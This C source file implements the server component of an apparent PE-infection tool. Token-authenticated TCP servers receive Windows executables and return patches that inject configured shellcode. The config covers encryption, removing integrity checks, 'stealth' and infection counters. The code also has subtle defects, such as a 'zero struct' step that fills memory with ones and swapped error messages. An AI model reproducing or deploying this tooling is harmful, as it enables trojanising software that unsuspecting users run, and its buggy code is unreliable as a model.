/*
 * \file   libpefile.c
 * \author A.G.
 * \author A.A.
 * \brief  Provides PE patching functionality as server service
 */

#include "libpeserver.h"
#include "libpeprotocol.h"
#include "3rdparty/ini/minIni.h"
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdarg.h>
#include <time.h>
/* TLS Support */
#ifdef _WIN32 /* Windows/Linux Switch */
#include <winsock2.h>
#include <ws2tcpip.h>
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#endif

/* Callback for data procession (INTERNAL USE ONLY) */
typedef bool __peserver_data_processor(PESERVER *server, int sock, unsigned char *mem, size_t memsize);

/* Connection handler holder (INTERNAL USE ONLY) */
typedef struct _PESERVER_CONNECTION_HANDLER {
  int sock;                              // socket to communicate with client
  PESERVER *server;                      // PESERVER handle
  __peserver_data_processor *processor;  // Callback to process received data
  size_t receive_buffersize;             // Communication receivebuffer size
} PESERVER_CONNECTION_HANDLER;

/* Server handler holder (INTERNAL USE ONLY) */
typedef struct _PESERVER_SERVER_HANDLER {
  size_t port;                                     // Port to listen
  PESERVER *server;                                // PESERVER handle
  void *(*connection_handler)(void *);             // Callback for connection handler
  __peserver_data_processor *connection_processor; // Callback to process received data
  size_t receive_buffersize;                       // Communication receivebuffer size
  size_t connection_queue;                         // Size of connection queue
  size_t sAddr;                                    // Bind source address
  sem_t signal;                                    // Semaphore to signalize end of initialization
  bool launch_ok;                                  // Initialization ok if true
  int sock;                                        // Server - socket
} PESERVER_SERVER_HANDLER;

/* Opens connection to server */
static inline int __peserver_connect(char* host, short port, int protocol) {
  struct sockaddr_in *saddr = calloc(1, sizeof(struct sockaddr_in));
  struct hostent *he;
  int _socket;
  int socket_type = SOCK_STREAM;
  if (protocol == IPPROTO_UDP)
    socket_type = SOCK_DGRAM;

  /* Create Socket */
  if ((_socket = socket(AF_INET, socket_type, protocol)) == -1) {
    return 0;
  }
  memset(saddr, 0, sizeof(struct sockaddr_in));
  saddr->sin_family = AF_INET;

  /* Host wasn't a IPv4 Address: Resolve DNS */
  if ((he = gethostbyname(host)) == NULL) {
    return 0;
  }
  saddr->sin_addr.s_addr = *((long*) he->h_addr_list[0]);

  saddr->sin_port = htons(port);

  /* Connects Socket */
  if (connect(_socket, (struct sockaddr*) saddr, sizeof(struct sockaddr)) < 0) {
    return 0;
  }
  return _socket;
}

/* synchronized debugging */
static inline void __peserver_debug(PESERVER *server, int sock, char *msg, ...) {
# ifdef PESERVER_DEBUG_OUTPUT
  va_list args;
  va_start(args, msg);
  time_t timer;
  char buffer[29];
  struct tm* tm_info;
  time(&timer);

  /* Get time */
  tm_info = localtime(&timer);
  strftime(buffer, 29, "[%Y:%m:%d %H:%M:%S] ", tm_info);

  if (pthread_mutex_lock(&server->debug_mutex)) {
    return; /* Error locking mutex */
  }
  /* print timestamp */
  printf("%s", buffer);
  if (sock != 0) {
    printf("[SOCK:%d] ", sock);
  }
  /* Print message */
  vprintf(msg, args);
  fflush(stdout);
  pthread_mutex_unlock(&server->debug_mutex);
# endif
}

/* Converts token to hex string and vice versa. direction = true: hextoken->token, false: token->hextoken*/
/* Required: token & hextoken != 0, sizeof(token) >= PESERVER_TOKEN_SIZE, sizeof(hextoken) >= 2*sizeof(token) */
static inline void __peserver_convert_token(unsigned char *token, unsigned char* hextoken, bool direction) {
  unsigned char *pos;
  size_t count = 0;

  pos = hextoken;
  for (count = 0; count < PESERVER_TOKEN_SIZE; ++count) {
    /* hex string to token */
    if (direction) {
      sscanf((char*) pos, "%02x", (unsigned int *) &token[count]);
      /* token to hex string */
    } else {
      sprintf((char*) pos, "%02x", token[count]);
    }
    pos += 2 * sizeof(char);
  }

}

/* Process control data */
static bool __peserver_process_control_data(PESERVER *server, int sock, unsigned char *datamem, size_t datamemsize) {

  /* Keep connection */
  return peprotocol_process_data(server, sock, datamem, datamemsize);
}

/* Process PE Data */
static bool __peserver_process_pe_data(PESERVER *server, int sock, unsigned char *datamem, size_t datamemsize) {
  /* Represents a sentinel node (https://en.wikipedia.org/wiki/Sentinel_node) */
  uint8_t nothing[PEINFECT_PATCH_SENTINELSIZE] = { 0 };
  PEINFECT_PATCH patch;
  unsigned char *mem = NULL;
  unsigned char **mem_ref = (unsigned char **) &mem;
  size_t memsize;
  bool token_ok = true;
  size_t i = 0;

  /* Server isn't enabled */
  if (!server->enable_infection) {
    /* Send sentinel */
    send(sock, (const void*) nothing, PEINFECT_PATCH_SENTINELSIZE, 0);
    return false;
  }

  /* Check authentication token size */
  if (datamemsize < PESERVER_TOKEN_SIZE) {
    __peserver_debug(server, sock, "[CRTL] Invalid token size \n");
    send(sock, (const void*) nothing, PEINFECT_PATCH_SENTINELSIZE, 0);
    return false;
  }

  /* Compare token */
  /* DON'T USE memcpy() AND DON'T break THE LOOP! (Timing attacks!) */
  for (i = 0; i < PESERVER_TOKEN_SIZE; ++i) {
    if (datamem[i] != server->token[i]) {
      token_ok = false;
    }
  }

  /* Check token */
  if (!token_ok) {
    __peserver_debug(server, sock, "[CRTL] Invalid token\n");
    send(sock, (const void*) nothing, PEINFECT_PATCH_SENTINELSIZE, 0);
    return false;
  }

  /* Process PE data */
  datamem += PESERVER_TOKEN_SIZE;
  datamemsize -= PESERVER_TOKEN_SIZE;

  /* Try patch file */
  if (peinfect_infect_patch(datamem, datamemsize, server->infect, &patch)) {
    __peserver_debug(server, sock, "[PE] Valid PE header (%d bytes)\n", (uint32_t) datamemsize);
    /* Serialize data */
    if (peinfect_patch_serialize(&patch, mem_ref, &memsize)) {
      __peserver_debug(server, sock, "[PE] Send patch (%d bytes)\n", (uint32_t) memsize);
      /* Send patch to client */
      send(sock, (const void*) mem, memsize, 0);
      /* Free memory */
      free(mem);

    } else {
      /* Serialization error */
      __peserver_debug(server, sock, "[PE] Error during serialization\n");
      /* Send sentinel */
      send(sock, (const void*) nothing, PEINFECT_PATCH_SENTINELSIZE, 0);

    }
    /* Free patch structure */
    peinfect_free_patch(&patch);
  } else {
    /* No valid PE Header*/
    __peserver_debug(server, sock, "[PE] No valid PE header (%d bytes)\n", (uint32_t) datamemsize);
    /* Send sentinel */
    send(sock, (const void*) nothing, PEINFECT_PATCH_SENTINELSIZE, 0);

  }

  /* Close connection */
  return false;
}

/* Connection handler for each client */
static void *__peserver_connection_handler_data(void *data) {
  int read_size;

  /* Get the handler */
  PESERVER_CONNECTION_HANDLER *handler = (PESERVER_CONNECTION_HANDLER *) data;
  /* Get config */
  size_t sock = handler->sock;
  PESERVER *server = handler->server;
  __peserver_data_processor *processor = handler->processor;
  size_t receive_buffersize = handler->receive_buffersize;
  char *receive_buffer = malloc(receive_buffersize);
  /* Free handler */
  free(handler);

  /* Couldn't allocate Buffer */
  if (receive_buffer == NULL) {
    __peserver_debug(server, sock, "[SRV] Receive buffer allocation error\n");
    return NULL;
  }

  /* receive data from client */
  while ((read_size = recv(sock, receive_buffer, receive_buffersize, 0)) > 0) {
    /* process data */
    if (!processor(server, sock, (unsigned char*) receive_buffer, read_size)) {
      /* close connection if processor signalizes */
      shutdown(sock, 1);
      close(sock);
      break;

    }
  }

  /* Connection terminated */
  __peserver_debug(server, sock, "[SRV] Connection terminated\n");
  return NULL;
}

/* Server Handler */
static void *__peserver_server_handler(void *data) {
  int _true = 1;
  pthread_t thread_id;
  int socket_desc, client_sock;
  size_t c = sizeof(struct sockaddr_in);
  struct sockaddr_in server, client;
  PESERVER_CONNECTION_HANDLER *handler;

  /* Get server configuration */
  PESERVER_SERVER_HANDLER *shandler = (PESERVER_SERVER_HANDLER *) data;
  /* Load config */
  PESERVER *peserver = shandler->server;
  size_t port = shandler->port;
  void *(*generic_connection_handler)(void *) = shandler->connection_handler;
  __peserver_data_processor *processor = shandler->connection_processor;
  size_t receive_buffersize = shandler->receive_buffersize;
  size_t connection_queue = shandler->connection_queue;
  size_t sAddr = shandler->sAddr;

  /* Create socket */
  socket_desc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (socket_desc == -1) {
    __peserver_debug(peserver, 0, "[INIT] Create socket failed\n");
    shandler->launch_ok = false;
    sem_post(&shandler->signal);
    return NULL;
  }

  /* Enable reuse of address */
  setsockopt(socket_desc, SOL_SOCKET, SO_REUSEADDR, (const char*) &_true, sizeof(int));

  /* Prepare the sockaddr_in structure */
  server.sin_family = AF_INET;
  server.sin_addr.s_addr = sAddr;
  server.sin_port = htons(port);

  /* Bind */
  if (bind(socket_desc, (struct sockaddr *) &server, sizeof(server)) < 0) {
    __peserver_debug(peserver, socket_desc, "[INIT] Listen socket failed (Port %d)\n", port);
    shandler->launch_ok = false;
    sem_post(&shandler->signal);
    return NULL;
  }

  /* Listen */
  if (listen(socket_desc, connection_queue)) {
    __peserver_debug(peserver, socket_desc, "[INIT] Bind socket failed (Port %d)\n", port);
    shandler->launch_ok = false;
    sem_post(&shandler->signal);
    return NULL;
  }

  /* Signal everything ok */
  shandler->launch_ok = true;
  shandler->sock = socket_desc;
  sem_post(&shandler->signal);

  /* Wait for incoming connections */
  while ((client_sock = accept(socket_desc, (struct sockaddr *) &client, (socklen_t*) &c)) > 0) {
    /* Server is terminating */
    if (peserver->terminating) {
      __peserver_debug(peserver, socket_desc, "[SRV] Handler received termination signal\n");

      /* Terminate socket */
      close(socket_desc);

      /* Signalize termination*/
      sem_post(&peserver->signal);
      return NULL;
    }

    /* build new handler */
    handler = calloc(1, sizeof(PESERVER_CONNECTION_HANDLER));
    if (handler == NULL) {
      __peserver_debug(peserver, client_sock, "[SRV] Handler allocation error\n");
      continue;
    }

    /* Configure Handler */
    handler->sock = client_sock;
    handler->server = peserver;
    handler->processor = processor;
    handler->receive_buffersize = receive_buffersize;

    /* Launch thread */
    memset(&thread_id, 0, sizeof(pthread_t));
    if (pthread_create(&thread_id, NULL, generic_connection_handler, (void*) handler) < 0) {
      __peserver_debug(peserver, client_sock, "[SRV] Handler launch error\n");
      free(handler);
      continue;
    }

    __peserver_debug(peserver, client_sock, "[SRV] Incoming connection from %d.%d.%d.%d\n",
        (int) (client.sin_addr.s_addr & 0xFF), (int) ((client.sin_addr.s_addr & 0xFF00) >> 8),
        (int) ((client.sin_addr.s_addr & 0xFF0000) >> 16), (int) ((client.sin_addr.s_addr & 0xFF000000) >> 24));
  }

  return NULL;
}

/* Try launch data - server*/
static inline bool __peserver_launch_server(PESERVER *server, size_t sAddr, size_t port, size_t connection_queue,
    size_t receive_buffersize, __peserver_data_processor *processor, pthread_t *thread_id, int *sock) {
  bool returnVar = false;
  PESERVER_SERVER_HANDLER *handler = calloc(1, sizeof(PESERVER_SERVER_HANDLER));
  if (handler == NULL) {
    return returnVar;
  }

  /* Configure Handler */
  handler->port = port;
  handler->server = server;
  handler->connection_handler = __peserver_connection_handler_data;
  handler->connection_processor = processor;
  handler->launch_ok = false;
  handler->sAddr = sAddr;
  handler->receive_buffersize = receive_buffersize;
  handler->connection_queue = connection_queue;
  if (sem_init(&handler->signal, 0, 0) != 0) {
    return returnVar;
  }

  /* Try create server thread */
  if (pthread_create(thread_id, NULL, __peserver_server_handler, (void*) handler) < 0) {
    __peserver_debug(server, 0, "[INIT] Couldn't launch server thread\n");
    sem_destroy(&handler->signal);
    return returnVar;
  }

  /* Wait for confirmation */
  sem_wait(&handler->signal);
  sem_destroy(&handler->signal);
  *sock = handler->sock;
  returnVar = handler->launch_ok;
  free(handler);

  /* Detach thread */
  pthread_detach(*thread_id);

  return returnVar;
}

bool peserver_init(PEINFECT *infect, PECONFIG *configuration, PESERVER *server) {
  bool returnVar = false;
  bool start_crtl_server = true;
  pthread_t control_id;
  pthread_t data_id;
  int control_sock = 0;
  int data_sock = 0;
  size_t data_sAddr = 0;
  size_t data_port = 0;
  size_t control_sAddr = 0;
  size_t control_port = 0;
  unsigned char hextoken[2 * PESERVER_TOKEN_SIZE + 1] = { 0 };
  unsigned char token[PESERVER_TOKEN_SIZE];
  size_t token_size = 0;

  /* Clear structure */
  memset(server, 0, sizeof(PESERVER));

  /*Reset token */
  memcpy(&server->token[0], PESERVER_TOKEN_MAGIC, PESERVER_TOKEN_MAGIC_SIZE);

  /* Load token */
  token_size = ini_gets("server", "token", "", (char *) hextoken, 2 * PESERVER_TOKEN_SIZE + 1,
      configuration->config_name);
  if (token_size == 2 * PESERVER_TOKEN_SIZE) {
    __peserver_convert_token(token, hextoken, true);
    /* Set token */
    peserver_set_token(token, PESERVER_TOKEN_SIZE, server);
  }

  /* not terminating */
  server->terminating = false;

  /* Set configuration */
  server->config = configuration;

  /* Set enable */
  server->enable_infection = (bool)ini_getl("server", "enable", 31338, configuration->config_name);

  /* Persistent ports */
  server->persistent_ports = (bool)ini_getl("server", "persistent_ports", false, configuration->config_name);

  /* Launch crtl-server? */
  start_crtl_server = ini_getl("server", "start_control_server", true, configuration->config_name);

  /* Load server ports and interfaces */
  data_sAddr =
      ini_getl("server", "data_interface", 0, configuration->config_name) ? inet_addr("127.0.0.1") : INADDR_ANY;
  data_port = ini_getl("server", "data_port", 31337, configuration->config_name);

  control_sAddr =
      ini_getl("server", "control_interface", 0, configuration->config_name) ? inet_addr("127.0.0.1") : INADDR_ANY;
  control_port = ini_getl("server", "control_port", 31338, configuration->config_name);

  /* Initialize signal semaphore */
  if (sem_init(&server->signal, 0, 0) != 0) {
    return returnVar;
  }

  /* Initialize mutex */
  if (pthread_mutex_init(&server->mutex, 0) != 0) {
    return returnVar;
  }

# ifdef PESERVER_DEBUG_OUTPUT
  /* Initialize debug mutex */
  if (pthread_mutex_init(&server->debug_mutex, 0) != 0) {
    return returnVar;
  }
# endif

  /* Windows, WSA Startup */
# ifdef _WIN32
  __peserver_debug(server, 0, "[INIT] Windows only: WSA Startup\n");
  WSADATA wsaData;
  if (WSAStartup(0x202, &wsaData) != 0) {
    return returnVar;
  }
# endif

  /* Set PEINFECT to work with */
  server->infect = infect;

  /* Launch data server */
  returnVar = __peserver_launch_server(server, data_sAddr, data_port, PESERVER_CONNECTION_QUEUE_PE,
  PESERVER_RECEIVE_BUFFER_PE, __peserver_process_pe_data, &data_id, &data_sock);
  if (!returnVar) {
    __peserver_debug(server, 0, "[INIT] Couldn't launch data server\n");
    return returnVar;
  }
  /* Launch control server */
  if (start_crtl_server) {
    returnVar = __peserver_launch_server(server, control_sAddr, control_port, PESERVER_CONNECTION_QUEUE_CONTROL,
    PESERVER_RECEIVE_BUFFER_CONTROL, __peserver_process_control_data, &control_id, &control_sock);
    if (!returnVar) {
      __peserver_debug(server, 0, "[INIT] Couldn't launch control server\n");
    }
  }

  /* Save sockets */
  server->control_sock = control_sock;
  server->data_sock = data_sock;

  /* Save ports */
  server->control_port = control_port;
  server->data_port = data_port;

  /* Write config */
  peserver_write_config(server);

  if (returnVar) {
    __peserver_debug(server, 0, "[INIT] Launch OK, Servers are up\n");
    __peserver_debug(server, data_sock, "[INIT] Data port:    %d\n", (uint32_t) data_port);
    if (start_crtl_server) {
      __peserver_debug(server, control_sock, "[INIT] Control port: %d\n", (uint32_t) control_port);
    }
  }

  return returnVar;
}

bool peserver_init_config(char *config_name, char *shellcode_x86_name, char *shellcode_x64_name, PECONFIG *out) {
  size_t len = 0;

  /* Zero struct */
  memset(out, 1, sizeof(PECONFIG));

  /* Init mutex */
  if (pthread_mutex_init(&out->config_mutex, 0) != 0) {
    peserver_free_config(out);
    return false;
  }
  if (pthread_mutex_init(&out->shellcode_x86_mutex, 0) != 0) {
    peserver_free_config(out);
    return false;
  }
  if (pthread_mutex_init(&out->shellcode_x64_mutex, 0) != 0) {
    peserver_free_config(out);
    return false;
  }

  /* Copy config name*/
  len = strlen(config_name);
  out->config_name = malloc(len + 1);
  if (!out->config_name) {
    peserver_free_config(out);
    return false;
  }
  strcpy(out->config_name, config_name);

  /* Copy x86 name*/
  len = strlen(shellcode_x86_name);
  out->shellcode_x86_name = malloc(len + 1);
  if (!out->shellcode_x86_name) {
    peserver_free_config(out);
    return false;
  }
  strcpy(out->shellcode_x86_name, shellcode_x86_name);

  /* Copy x64 name*/
  len = strlen(shellcode_x64_name);
  out->shellcode_x64_name = malloc(len + 1);
  if (!out->shellcode_x64_name) {
    peserver_free_config(out);
    return false;
  }
  strcpy(out->shellcode_x64_name, shellcode_x64_name);

  return true;
}

void peserver_free_config(PECONFIG *out) {

  /* Destroy mutex */
  pthread_mutex_destroy(&out->config_mutex);
  pthread_mutex_destroy(&out->shellcode_x86_mutex);
  pthread_mutex_destroy(&out->shellcode_x64_mutex);

  /* Free names */
  if (out->config_name) {
    free(out->config_name);
  }
  if (out->shellcode_x86_name) {
    free(out->shellcode_x86_name);
  }
  if (out->shellcode_x64_name) {
    free(out->shellcode_x64_name);
  }
}

void peserver_write_config(PESERVER *server) {
  size_t data_interface = 0;
  size_t data_port = 0;
  size_t control_interface = 0;
  size_t control_port = 0;
  unsigned char hextoken[2 * PESERVER_TOKEN_SIZE + 1] = { 0 };

  /* convert token */
  __peserver_convert_token(peserver_get_token(server), hextoken, false);

  /* Lock Mutex */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* Names */
  ini_puts("name", "section_name", peinfect_get_sectionname(server->infect), server->config->config_name);
  ini_putl("name", "section_name_random", server->infect->rnd_sectionname, server->config->config_name);

  /* Methods */
  ini_putl("methods", "method_alignment", (bool) (peinfect_get_methods(server->infect) & METHOD_ALIGNMENT),
      server->config->config_name);
  ini_putl("methods", "method_alignment_resize",
      (bool) (peinfect_get_methods(server->infect) & METHOD_ALIGNMENT_RESIZE), server->config->config_name);
  ini_putl("methods", "method_new_section", (bool) (peinfect_get_methods(server->infect) & METHOD_NEW_SECTION),
      server->config->config_name);
  ini_putl("methods", "method_change_flags", (bool) (peinfect_get_methods(server->infect) & METHOD_CHANGE_FLAGS),
      server->config->config_name);
  ini_putl("methods", "method_cross_section_jump",
      (bool) (peinfect_get_methods(server->infect) & METHOD_CROSS_SECTION_JUMP), server->config->config_name);
  ini_putl("methods", "method_cross_section_jump_iterations", peinfect_get_jumpiterations(server->infect),
      server->config->config_name);

  /* Encryption */
  ini_putl("methods", "encrypt", (bool) peinfect_get_encrypt(server->infect), server->config->config_name);
  ini_putl("methods", "encrypt_iterations", peinfect_get_encryptiterations(server->infect),
      server->config->config_name);

  /* Integrity checks */
  ini_putl("integrity", "remove_integrity_check", (bool) peinfect_get_removeintegrity(server->infect),
      server->config->config_name);
  ini_putl("integrity", "try_stay_stealth", (bool) peinfect_get_trystaystealth(server->infect),
      server->config->config_name);

  /* Enable server */
  ini_putl("server", "enable", server->enable_infection, server->config->config_name);

  /* Persistent ports */
  ini_putl("server", "persistent_ports", server->persistent_ports, server->config->config_name);

  /* Token server */
  ini_puts("server", "token", (char *) hextoken, server->config->config_name);

  /* Interface and ports*/
  data_interface = ini_getl("server", "data_interface", 0, server->config->config_name);
  data_port = ini_getl("server", "data_port", 31337, server->config->config_name);
  control_interface = ini_getl("server", "control_interface", 0, server->config->config_name);
  control_port = ini_getl("server", "control_port", 31338, server->config->config_name);

  /* Server */
  ini_putl("server", "data_port", data_port, server->config->config_name);
  ini_putl("server", "data_interface", data_interface, server->config->config_name);
  ini_putl("server", "control_port", control_port, server->config->config_name);
  ini_putl("server", "control_interface", control_interface, server->config->config_name);

  /* Statistics */
  ini_putl("statistics", "infection_counter_x86", peinfect_get_infectcounter(server->infect, false),
      server->config->config_name);
  ini_putl("statistics", "infection_counter_x64", peinfect_get_infectcounter(server->infect, true),
      server->config->config_name);

  /* Unlock Mutex */
  pthread_mutex_unlock(&server->config->config_mutex);
}

unsigned char* peserver_get_token(PESERVER *server) {
  return (unsigned char*) &server->token[0];
}

bool peserver_set_token(unsigned char *token, size_t tokensize, PESERVER *server) {
  /* Reset token */
  if (token == NULL) {
    memset(&server->token[PESERVER_TOKEN_MAGIC_SIZE], 0, PESERVER_TOKEN_SIZE - PESERVER_TOKEN_MAGIC_SIZE);
    memcpy(&server->token[0], PESERVER_TOKEN_MAGIC, PESERVER_TOKEN_MAGIC_SIZE);
    return true;
  }

  /* Set Token */
  if ((tokensize == PESERVER_TOKEN_SIZE) && (memcmp(token, PESERVER_TOKEN_MAGIC, PESERVER_TOKEN_MAGIC_SIZE) == 0)) {
    memcpy(&server->token[0], token, PESERVER_TOKEN_SIZE);
    return true;
  }

  return false;
}

bool peserver_wait(PESERVER *server) {
  bool server_terminating = false;

  /* Register watcher if not terminating  */
  if (pthread_mutex_lock(&server->mutex)) {
    return false; /* Error locking mutex */
  }
  server_terminating = server->terminating;
  if (!server_terminating) {
    server->watchers++;
  }
  pthread_mutex_unlock(&server->mutex);

  /* If already terminating, exit*/
  if (server_terminating) {
    return server->restart;
  }

  /* Otherwise, wait till termination */
  sem_wait(&server->signal);

  /* Return restart flag */
  return server->restart;
}

void peserver_terminate(bool restart, PESERVER *server) {
  size_t i;

  /* Signalizes termination, no more watchers will be able to register */
  __peserver_debug(server, 0, "[SRV] Initialize termination sequence\n");
  if (pthread_mutex_lock(&server->mutex)) {
    return; /* Error locking mutex */
  }
  if (server->terminating) {
    pthread_mutex_unlock(&server->mutex);
    return;
  }
  /* Set restart flag */
  server->restart = restart;
  /* Set terminating flag */
  server->terminating = true;
  pthread_mutex_unlock(&server->mutex);

  /* Signalizes every watcher */
  for (i = 0; i < server->watchers; ++i) {
    sem_post(&server->signal);
  }
  __peserver_debug(server, 0, "[SRV] Termination sequence done\n");
}

void peserver_enable_infection(bool enable, PESERVER *server) {
  server->enable_infection = enable;
}

void peserver_free(PESERVER *server) {
  int sock = 0;

  /* Wait until terminated */
  peserver_wait(server);

  /* Close sockets */
  if (server->control_sock) {
    __peserver_debug(server, server->control_sock, "[TERM] Close listening socket\n");
    sock = __peserver_connect("127.0.0.1", server->control_port, IPPROTO_TCP);
    if (sock) {
      sem_wait(&server->signal);
      close(sock);
    }
  }
  if (server->data_sock) {
    __peserver_debug(server, server->data_sock, "[TERM] Close listening socket\n");
    sock = __peserver_connect("127.0.0.1", server->data_port, IPPROTO_TCP);
    if (sock) {
      sem_wait(&server->signal);
      close(sock);
    }
  }

  /* Windows, WSA Cleanup */
# ifdef _WIN32
  __peserver_debug(server, 0, "[TERM] Windows only: WSA Cleanup\n");
  WSACleanup();
# endif

  /* Destroy mutex and semaphores*/
  sem_destroy(&server->signal);
  pthread_mutex_destroy(&server->mutex);
# ifdef PESERVER_DEBUG_OUTPUT
  pthread_mutex_destroy(&server->debug_mutex);
# endif

  /* Clear structure */
  memset(server, 0, sizeof(PESERVER));
}
